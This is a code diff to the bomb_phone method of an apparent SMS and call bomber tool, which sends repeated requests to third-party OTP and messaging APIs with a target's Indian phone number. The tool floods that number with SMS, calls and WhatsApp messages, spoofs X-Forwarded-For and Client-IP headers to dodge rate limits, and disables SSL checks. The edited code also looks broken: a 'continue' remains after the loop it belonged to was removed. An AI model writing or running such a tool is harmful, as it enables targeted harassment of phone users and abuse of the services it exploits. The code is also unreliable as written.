@@ -158,64 +158,73 @@ class BombingSession:
         }
     
     async def bomb_phone(self, session: aiohttp.ClientSession, api: dict, phone: str):
-        while self.running:
-            try:
-                name = api["name"]
-                url = api["url"](phone) if callable(api["url"]) else api["url"]
-                headers = {k: v for k, v in api["headers"].items()}
-                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                headers["Client-IP"] = headers["X-Forwarded-For"]
-                headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-                
-                self.stats["total_requests"] += 1
-                
-                # Update type-specific stats
-                if api["type"] == "call":
-                    self.stats["calls_sent"] += 1
-                    emoji = "📞"
-                    tag = "call"
-                elif api["type"] == "whatsapp":
-                    self.stats["whatsapp_sent"] += 1
-                    emoji = "📱"
-                    tag = "whatsapp"
-                else:
-                    self.stats["sms_sent"] += 1
-                    emoji = "💬"
-                    tag = "sms"
-                
-                success = False
-                if api["method"] == "POST":
-                    data = api["data"](phone) if api["data"] else None
-                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
-                        if response.status in [200, 201, 202]:
-                            success = True
-                else:
-                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
-                        if response.status in [200, 201, 202]:
-                            success = True
-                
-                if success:
-                    self.stats["successful_hits"] += 1
-                    message = f"{emoji} {api['type'].upper()} HIT: {name} - SUCCESS! ({self.stats['successful_hits']})"
-                    print(f"\033[91m{message}\033[0m")
-                else:
-                    self.stats["failed_attempts"] += 1
-                    message = f"⚠️ {api['type'].upper()}: {name} - Failed"
-                
-                # Broadcast to all connected clients
-                await manager.broadcast({
-                    "type": "log",
-                    "tag": "success" if success else "error",
-                    "message": message,
-                    "stats": self.stats,
-                    "phone": phone
-                })
-                
-                await asyncio.sleep(random.uniform(2, 5))  # Ultra-fast speed
-            
-            except Exception as e:
-                self.stats["failed_attempts"] += 1
-                continue
+    # Phone number ko +91 prefix ke saath standardize karo
+    full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
+    
+    try:
+        name = api["name"]
+        # Ab poora phone number use karo
+        url = api["url"](full_phone) if callable(api["url"]) else api["url"]
+        headers = {k: v for k, v in api["headers"].items()}
+        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        headers["Client-IP"] = headers["X-Forwarded-For"]
+        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        
+        self.stats["total_requests"] += 1
+        
+        # Update type-specific stats
+        if api["type"] == "call":
+            self.stats["calls_sent"] += 1
+            emoji = "📞"
+            tag = "call"
+        elif api["type"] == "whatsapp":
+            self.stats["whatsapp_sent"] += 1
+            emoji = "📱"
+            tag = "whatsapp"
+        else:
+            self.stats["sms_sent"] += 1
+            emoji = "💬"
+            tag = "sms"
+        
+        success = False
+        if api["method"] == "POST":
+            data = api["data"](full_phone) if api["data"] else None
+            async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
+                if response.status in [200, 201, 202]:
+                    success = True
+        else:
+            # For GET APIs, update URL to include full_phone
+            if callable(api["url"]):
+                final_url = api["url"](full_phone)
+            else:
+                final_url = api["url"].format(phone=full_phone) if "{phone}" in api["url"] else api["url"]
+            async with session.get(final_url, headers=headers, timeout=10, ssl=False) as response:
+                if response.status in [200, 201, 202]:
+                    success = True
+        
+        if success:
+            self.stats["successful_hits"] += 1
+            message = f"{emoji} {api['type'].upper()} HIT: {name} - SUCCESS! ({self.stats['successful_hits']})"
+            print(f"\033[91m{message}\033[0m")
+        else:
+            self.stats["failed_attempts"] += 1
+            message = f"⚠️ {api['type'].upper()}: {name} - Failed"
+        
+        # Broadcast to all connected clients
+        await manager.broadcast({
+            "type": "log",
+            "tag": "success" if success else "error",
+            "message": message,
+            "stats": self.stats,
+            "phone": full_phone
+        })
+        
+        await asyncio.sleep(random.uniform(2,5))  # Ab slow hai
+    
+    except Exception as e:
+        self.stats["failed_attempts"] += 1
+        print(f"❌ Failed to hit {name}: {str(e)}")
+        continue
     
     async def start(self):
         self.running = True
